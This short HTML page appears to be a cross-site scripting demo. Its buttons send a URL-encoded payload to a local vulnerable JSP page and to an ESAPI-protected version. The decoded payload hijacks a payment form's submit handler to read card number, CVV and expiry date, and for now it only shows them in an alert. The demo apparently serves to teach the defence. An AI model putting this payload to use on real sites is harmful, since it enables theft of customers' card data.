<html>
<body>
<script language="javascript">
var xss_url = "/XSS_Vulnerable/xss_html.jsp?amount=23.44";
var xss_url_esapi = "/XSS_Vulnerable/xss_html_esapi.jsp?amount=23.44";
xss_url_params = "%22+%2F%3E+%0A%3Cscript+language%3D%27javascript%27%3E+%0Afunction+sendCC%28%29{+%0A+form+%3D+document.getElementById%28%27sendForm%27%29%3B+%0A+cc+%3D+form.cc.value%3B+%0A+cvv+%3D+form.cvv.value%3B+%0A+year+%3D+form.expYear.value%3B+%0A+month+%3D+form.expMonth.value%3B+%0A+alert%28%27Sending+to+bad+guy+cc%3A%27+%2B+cc+%2B+%27+date%3A%27+%2B+month+%2B+%27%2F%27+%2B+year+%2B+%27+cvv%3A%27+%2B+cvv%29%3B%0A+return+sendPaymentRequest%28%29%3B%0A}+%0A%0Awindow.onload+%3D+function+%28%29+{+%0A+var+submitForm+%3D+document.getElementById%28%27sendForm%27%29%3B%0A+submitForm.setAttribute%28%27onsubmit%27%2C+%27sendCC%28%29%27%29%3B+%0A}%0A%3C%2Fscript%3E+%3Cbr";
function xss_redirect(){
	document.location = xss_url + xss_url_params;
}

function xss_redirect_esapi(){
	document.location = xss_url_esapi + xss_url_params;
}

</script>
<input type="button" value="Send XSS string" onclick="xss_redirect()"/>
</br>
<input type="button" value="Send XSS string to ESAPI" onclick="xss_redirect_esapi()"/>

</body>
</html>
